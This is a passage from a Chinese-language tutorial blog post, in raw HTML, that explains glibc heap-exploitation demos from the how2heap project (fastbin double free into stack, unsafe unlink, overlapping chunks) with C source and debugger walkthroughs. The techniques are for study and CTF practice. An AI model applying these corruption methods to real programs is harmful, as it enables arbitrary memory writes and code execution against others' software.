bin中了，这是为什么呢</p><p>我们再次free的时候ptmalloc会发现fastbin是空闲的，因此就把他扔到fastbin中去了，此时就可以分配两次p1了，一次会在fastbin中取出(优先查看fastbin)，第二次就会在smallbin中取出:)</p><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>程序先malloc了两个fastbin(0x40)，然后free掉第一个chunk</p><p>这里为什么不free掉第二个chunk，因为第二个chunk是跟top chunk相邻，如果free了就会合并到top chunk中</p><p>之后程序调用了malloc函数malloc了一个large bin，触发了malloc_consoldate函数，导致我们free掉的chunk进入了small bin中然后程序第二次free chunk1，ptmalloc会先看fastbin中有没有，发现没有，于是就把chunk放入到fastbin中，这是chunk在fastbin和small bin中就各有一个，此时程序再申请两次0x40的chunk,ptmalloc先从fastbin中把chunk1取出来给用户,然后再从smallbin中再次把chunk1取出来给用户，我们就有了两个拥有同样内存的chunk。</p><h1 id="0x04-fastbin-dup-into-stack"><a href="#0x04-fastbin-dup-into-stack" class="headerlink" title="0x04 fastbin_dup_into_stack"></a>0x04 fastbin_dup_into_stack</h1><h2 id="源代码-3"><a href="#源代码-3" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 这个程序就是fast_dup的2.0版，作用就是欺骗系统把malloc的地址转到我们所能控制内容的栈上,也就是让下一次分配内存时在我们所能控制的栈上分配</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file extends on fastbin_dup.c by tricking malloc into\n&quot;</span></span><br><span class="line">       <span class="string">&quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_var;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//我们控制分配的地址就是这个栈上变量的地方</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, <span class="number">8</span>+(<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里还是一样的,不能连续释放同一个chunk</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line"><span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里再次,释放a,double free</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. &quot;</span></span><br><span class="line"><span class="string">&quot;We&#x27;ll now carry out our attack by modifying data at %p.\n&quot;</span>, a, b, a, a);</span><br><span class="line">    <span class="comment">//现在第一次分配内存,取出chunk a 赋给chunk d</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//现在分配两次内存,取出chunk a,chunk b</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, d);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">    <span class="comment">//现在free list就只剩下一个chunk a了</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p ].\n&quot;</span>, a);</span><br><span class="line">    <span class="comment">//现在的chunk a是free list的头chunk了,现在我们把一个假的free size写到栈上,这个时候ptmalloc就会认为栈上有一个free的chunk,就会把指针回转给他了</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span></span><br><span class="line"><span class="string">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span></span><br><span class="line"><span class="string">&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</span></span><br><span class="line"><span class="string">&quot;return a pointer to it.\n&quot;</span>, a);</span><br><span class="line">stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//现在我们把栈指针的向前八个字节写成0x20,也就是伪造free size,然后把他赋给d</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;</span>, a);</span><br><span class="line">*d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这个时候就把栈指针写到了free list上了,此时再分配就是在栈上分配了</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;4th malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果及调试-2"><a href="#运行结果及调试-2" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>首先看下分配完三个chunk后的结果</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508844964/0" alt="image-20210510143659280"></p><p>此时我们利用fastbin的double free来形成一个环</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508848465/0" alt="image-20210510143743534"></p><p>接下来我们要将第二次free的a给申请回来，作为我们的d，并且将这个d的fd赋值为stack_var的地址</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508861212/0" alt="image-20210510144108062"></p><p>能看到此时我们的d的fd地方已经写上了stack_var的地址</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508873167/0" alt="image-20210510144425686"></p><p>此时我们的free list中有了栈指针，我们再继续分配就可以分配到栈的内存空间了</p><h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>程序先在栈上定义了一个变量stack_var</p><p>之后malloc了三个chunk a,b,c</p><p>之后做了一个double free,形成了一个a-&gt;b-&gt;a的free链</p><p>此时再次malloc了一个大小一样的chunk d,这个时候chunk d会拿出chunk a</p><p>之后我们又申请了一个一样大小的chunk出来拿出了b,这个时候链上就只剩下一个a了</p><p>此时我们伪造了stack_var,把他伪装成了一个free chunk,并且赋值给了chunk d,也就是chunk a,此时fd指针被伪造成了fake chunk,形成了一个新的free链</p><p>最后再申请内存的时候,我们就取出了栈上的内存</p><p>这种利用手法，变体的一种方式，也是平时做题时常用的一种手法就是栈地址变成了堆地址。</p><h1 id="0x05-unsafe-unlink"><a href="#0x05-unsafe-unlink" class="headerlink" title="0x05 unsafe_unlink"></a>0x05 unsafe_unlink</h1><p>unlink是一种经常会用到的技巧，关于unlink是什么就不介绍了，简单说下使用unlink的时机</p><ul><li>malloc<ol><li>在恰好大小的large chunk处取chunk时</li><li>在比请求大小大的bin中取chunk时</li></ol></li><li>free<ol><li>后向合并，合并物理相邻低物理地址空闲chunk时</li><li>前向合并，合并物理相邻高物理地址空闲chunk时(top chunk除外)</li></ol></li><li>malloc_consolidate<ol><li>后向和并，合并物理相邻低地址空闲chunk时</li><li>前向合并，合并物理相邻高地址空闲chunk时(top chunk除外)</li></ol></li><li>realloc<ol><li>前向拓展，合并物理相邻高地址空闲chunk（top chunk除外）</li></ol></li></ul><p>关于攻击效果的话就是p处的指针会变为 p-0x18</p><h2 id="源代码-4"><a href="#源代码-4" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//we want to be big enough not to use fastbins</span></span><br><span class="line">   <span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//本测试的重点就是利用free来破坏我们的全局全局chunk0_ptr以实现任意地址写</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">   chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">   <span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line">    </span><br><span class="line">   <span class="comment">// 全局指针为chunk0_ptr，我们将要攻击的chunk为chunk1_ptr </span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 我们要在chunk0中伪造一个chunk</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;We create a fake chunk inside chunk0.\n&quot;</span>);</span><br><span class="line">   <span class="comment">// 我们把我们的fake_chunk的fd指向我们的chunk0_ptr来满足P-&gt;FD-&gt;BK=P </span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);</span><br><span class="line">   chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">   <span class="comment">// 我们把我们的fake_chunk的bk指针指向我们的chunk0_ptr来满足P-&gt;BK-&gt;FD</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);</span><br><span class="line">   <span class="comment">//通过这么设置,我们就可以成功bypass堆的检测即(P-&gt;FD-&gt;BK!=P||P-&gt;BK-&gt;FD!=P)==FALSE </span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);</span><br><span class="line">   chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Fake chunk fd: %p\n&quot;</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//我们假设我们可以通过溢出chunk0使得我们可以自由的更改chunk1的内容</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;</span>);</span><br><span class="line">   <span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">//我们用chunk1的previous_size来收缩chunk0，让free认为我们的chunk0是在我们伪造的chunk地方开始的</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;</span>);</span><br><span class="line">   chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">   <span class="comment">//如果我们正常的free chunk0，那么chunk1的pre_size将是0x90，然后现在是一个新的值 </span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n&quot;</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">   <span class="comment">//我们通过将chunk1的pre_inuse设置为false，就可以将我们所伪造的chunk标记为free状态</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);</span><br><span class="line">   chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//现在我们free chunk1，这是发生向后合并将会unlink我们所伪造的chunk，从而覆写chunk0_ptr</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n&quot;</span>);</span><br><span class="line">   <span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//在这个指针上，我们可以通过chunk0_ptr来覆写其自身以指向任意内存</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;</span>);</span><br><span class="line">   <span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">   <span class="built_in">strcpy</span>(victim_string,<span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">   chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//chunk0_ptr如今指向了我们想要的地方，我们可以用它来写我们的字符串了</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Original value: %s\n&quot;</span>,victim_string);</span><br><span class="line">   chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// sanity check</span></span><br><span class="line">   assert(*(<span class="keyword">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在进行调试前我们先康康unlink的部分代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1344</span><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="number">1345</span>     FD = P-&gt;fd;                                                               \</span><br><span class="line"><span class="number">1346</span>     BK = P-&gt;bk;                                                               \</span><br><span class="line"><span class="number">1347</span>     <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                     \</span><br><span class="line"><span class="number">1348</span>       malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line"><span class="number">1349</span>     <span class="keyword">else</span> &#123;                                                                    \</span><br><span class="line"><span class="number">1350</span>         FD-&gt;bk = BK;                                                          \</span><br><span class="line"><span class="number">1351</span>         BK-&gt;fd = FD;                                                          \</span><br><span class="line"><span class="number">1352</span>         <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)                                      \</span><br><span class="line"><span class="number">1353</span>             &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;                \</span><br><span class="line"><span class="number">1354</span>             <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)        \</span><br><span class="line"><span class="number">1355</span>                 || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line"><span class="number">1356</span>               malloc_printerr (check_action,                                  \</span><br><span class="line"><span class="number">1357</span>                                <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line"><span class="number">1358</span>                                P, AV);                                        \</span><br><span class="line"><span class="number">1359</span>             <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                                    \</span><br><span class="line"><span class="number">1360</span>                 <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                                      \</span><br><span class="line"><span class="number">1361</span>                   FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                     \</span><br><span class="line"><span class="number">1362</span>                 <span class="keyword">else</span> &#123;                                                        \</span><br><span class="line"><span class="number">1363</span>                     FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                         \</span><br><span class="line"><span class="number">1364</span>                     FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                         \</span><br><span class="line"><span class="number">1365</span>                     P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                         \</span><br><span class="line"><span class="number">1366</span>                     P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                         \</span><br><span class="line"><span class="number">1367</span>                   &#125;                                                           \</span><br><span class="line"><span class="number">1368</span>               &#125; <span class="keyword">else</span> &#123;                                                        \</span><br><span class="line"><span class="number">1369</span>                 P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                 \</span><br><span class="line"><span class="number">1370</span>                 P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                 \</span><br><span class="line"><span class="number">1371</span>               &#125;                                                               \</span><br><span class="line"><span class="number">1372</span>           &#125;                                                                   \</span><br><span class="line"><span class="number">1373</span>       &#125;                                                                       \</span><br><span class="line"><span class="number">1374</span> &#125;</span><br></pre></td></tr></table></figure><p>这里最主要需要绕过的地方就是(FD-&gt;bk != P || BK-&gt;fd != P)这里了，我们根据函数传进来的解释下</p><p>FD就算我们传进来的指针P的fd指针也就是FD=P-&gt;fd，而BK就是P-&gt;bk</p><p>也就是说我们需要满足的FD -&gt; bk = P，BK -&gt; fd = P其实就是</p><ol><li>P -&gt; fd -&gt; bk = P，即检测P的后一个空闲指针的前一个指针为P</li><li>P -&gt; bk -&gt; fd = P，同理检测P的前一个空闲指针的后一个指针为P</li></ol><p>那么如何利用呢，我们调试康康</p><h2 id="运行结果及调试-3"><a href="#运行结果及调试-3" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>首先我们停在mallc chunk0的地方</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13509297120/0" alt="image-20210510160016743"></p><p>此时我们有了一个chunk，接着我们再申请一个chunk，看下此时的堆块</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13509212229/0" alt="image-20210510160233831"></p><p>接着我们执行到下面的代码处</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13509222674/0" alt="image-20210510160420701"></p><p>注释中说我们将fake_chunk的fd指向我们chunk0_ptr</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13509495488/0" alt="image-20210510165958080"></p><p>这里一共输出了五样东西，可以看到chunk0_ptr[2]的值已经变成了&amp;chunk0_ptr-0x18</p><p>还记得之前说过的，我们需要在chunk0中伪造一个fake chunk</p><p>我们的chunk0_ptr是从0x603000开始的，但是我们要知道的是给用户的指针是从0x603010开始的，也就意味着我们的fake_chunk是从0x603010开始，以0x603020为fd指针，0x603028为bk指针</p><p>此时我们的fd指针已经伪造好了，下面我们直接结束伪造bk指针的部分，康康此时的堆</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13509526752/0" alt="image-20210510170603411"></p><p>好了，此时我们已经成功的伪造了我们的fake_chunk的fd和bk指针，程序注释说我们这样就可以成功bypass那两个条件，也就是P-&gt;FD-&gt;BK=P&amp;&amp;P-&gt;BK-&gt;FD=P了，这是为什么呢？</p><p>我们现在假设我们的fake_chunk的size已经设好了，并且他的fd=0x602060，bk=0x602068，那么</p><p>fake_chunk-&gt;fd-&gt;bk是多少呢，我们看一下</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13509546783/0" alt="image-20210510170903296"></p><p>可以看到此时的fake_chunk-&gt;fd-&gt;bk=0x603010，还记得我们刚刚所说的，我们所伪造的fake_chunk就是0x603010</p><p>此时第一个条件已经达成了，我们再来看看第二个条件，也就是P-&gt;BK-&gt;FD=P</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13509562621/0" alt="image-20210510171128701"></p><p>同样的，我们成功达成了第二个条件，此时的fake_chunk也就是指向我们全局变量的chunk0_ptr已经可以bypass了，现在值得注意的是我们刚刚假设size已经设好了，但其实并没有</p><p>那么根据程序所说，假设我们可以溢出chunk0来自由的更改chunk1的内容，我们就可以通过更改chunk1的pre_size域来使得我们的chunk收缩以骗过malloc让他认为我们的chunk1的上一个chunk是从我们的fake_chunk开始的</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13509594767/0" alt="image-20210510171652381"></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13509596070/0" alt="image-20210510171707941"></p><p>可以看到我们此时获取到了chunk1的地址，此时是为了修改chunk1的pre_size来实现chunk0收缩</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13509618775/0" alt="image-20210510172122600"></p><p>可以看到此时chunk1的pre_size域已经被设为了0x80，这也就意味着系统向前找chunk的时候会向前0x80找到我们的fake_chunk，但是这还不够，我们需要伪造chunk0是free态的chunk，只需要把标志位设为0就好了，也就是执行到下面一步</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13509636936/0" alt="image-20210510172451277"></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13509637692/0" alt="image-20210510172501037"></p><p>可以看到此时我们的chunk1的pre_inuse已经被设为0了</p><p>此时我们free chunk1，这是就会发生unlink</p><p>这里就触发了free的向后合并，也就是向物理相邻低地址合并从而调用unlink函数，此时的堆结构</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13509757035/0" alt="image-20210510174518847"></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13509770504/0" alt="image-20210510174729789"></p><p>可以看到此时本来存放chunk0地址的地方变成的&amp;chunk0_ptr-0x18，即本来0x602078存放的是chunk0_ptr也就是0x603010的地址，此时被修改成了0x602060，也就是chunk中包含了指向chunk的指针，并且我们可以覆写它，也就达到了任意地址读写</p><p>后面的赋值感觉没什么可以说的，前面的就是相当于直接修改了存放chunk指针的区域，导致劫持了chunk指针，从而能够达到任意读写的作用</p><h2 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2><p>依旧,程序先是弄了一个全局变量chunk0_ptr,紧接着给他申请了0x80实际上是0x90的内存空间</p><p>之后新建了一个大小一样的chunk1_ptr</p><p>这时我们要确定的是我们的全局指针是chunk0_ptr,要攻击的chunk是chunk1_ptr</p><p>之后程序构造了P-&gt;FD-&gt;BK=P和P-&gt;BK-&gt;FD=P的条件,想要伪造一个fake_chunk</p><p>假设我们拥有溢出的能力,修改chunk1_ptr的pre_size域让系统认为我们的上一个chunk是我们伪造的fake chunk,并且将chunk1_ptr的size域标志位置0以伪造其被free的假象</p><p>然后程序free掉了chunk1触发了free的后向合并从而调用了unlink函数,此时我们的攻击就算结束了</p><p>而程序的攻击效果就是将本来是P处的指针变为了P-0x18的指针,我们就拥有了任意内存读写的能力,over~</p><p>这里我们列出一下我们利用所需要的的一些条件：</p><ol><li>两个相邻chunk，一个chunk存放伪造的chunk</li><li>伪造的chunk中fd=存放伪造chunk的地址-0x18，伪造的chunk中bk=存放伪造chunk的地址-0x10</li><li>下一个chunk的pre_inuse位为0，且pre_size要刚好到伪造的chunk，即要收缩chunk</li><li>释放那个没有包含伪造chunk的chunk</li></ol><h1 id="0x06-overlapping-chunks"><a href="#0x06-overlapping-chunks" class="headerlink" title="0x06 overlapping_chunks"></a>0x06 overlapping_chunks</h1><p>overlapping在平常是非常常用的技巧</p><h2 id="源代码-5"><a href="#源代码-5" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *p1,*p2,*p3,*p4;</span><br><span class="line"></span><br><span class="line">p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n&quot;</span>, p1, p2, p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(p1, <span class="string">&#x27;1&#x27;</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memset</span>(p2, <span class="string">&#x27;2&#x27;</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow let&#x27;s free the chunk p2\n&quot;</span>);</span><br><span 